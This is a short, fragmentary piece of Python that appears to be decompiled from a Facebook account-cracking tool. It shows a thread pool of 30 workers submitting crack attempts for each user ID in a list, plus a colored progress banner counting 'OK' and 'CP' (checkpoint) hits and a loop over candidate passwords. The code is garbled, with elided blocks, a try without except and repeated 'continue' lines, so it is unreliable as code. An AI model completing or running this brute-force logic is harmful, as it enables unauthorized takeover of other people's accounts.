...
class __crack__:
                    ...
                    if cin == '':
                        ...
                        with mking__pass(max_workers = 30) as __mking__:
                            for ikeh in self.id:
                                ...
                                try:
                                    kimochi = ikeh.split('|')[0]
                                    __mking__.submit(self._crack____mfb, __, kimochi, ysc)
                                continue
                                continue
    ...
    def __api__(self, user, __yan__):
        global loop
        (sys.stdout.write('\r[%s\x1b[1;92mMOHAMMAD\xe2\x99\xa1SULTANI%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
